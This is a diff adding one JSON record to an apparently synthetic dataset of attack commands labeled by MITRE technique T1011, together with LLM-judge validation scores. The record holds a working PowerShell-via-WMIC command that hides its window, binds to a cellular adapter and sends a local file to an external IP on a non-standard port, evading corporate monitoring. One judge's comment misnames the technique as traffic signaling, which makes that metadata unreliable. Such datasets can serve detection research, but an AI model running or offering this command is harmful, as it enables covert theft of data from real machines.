@@ -1,0 +1,49 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Leverages WMIC to start PowerShell that binds to a WWAN/Cellular interface and exfiltrates data via TCP to a non-standard port. This uses a cellular medium to bypass the primary corporate network path.",
+  "rationale_steps": [
+    "Locate a mobile broadband (cellular) adapter using WMI.",
+    "Bind the TCP socket to the cellular interface's IPv4 address.",
+    "Connect to an external endpoint on an uncommon port.",
+    "Send file bytes over the WWAN path, consistent with T1011.",
+    "No global routing or adapter settings are changed."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-122a57d6",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid PowerShell/WMI syntax, using proper separators and constructs.",
+        "semantic_score": 2,
+        "semantic_justification": "It feasibly exfiltrates a file over a TCP connection bound to a cellular interface, but it does not embed or disguise signals within legitimate traffic as required by T1011 Traffic Signaling.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T15:49:53.222819Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct escaping for variables within the nested PowerShell command string, balanced quotes, and valid syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using WMIC to run PowerShell that identifies and binds to a cellular interface, then exfiltrates a file via TCP, effectively using an out-of-band network path to bypass typical corporate network monitoring, which aligns with the evasive nature of T1011 Traffic Signaling.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:50:27.254885Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
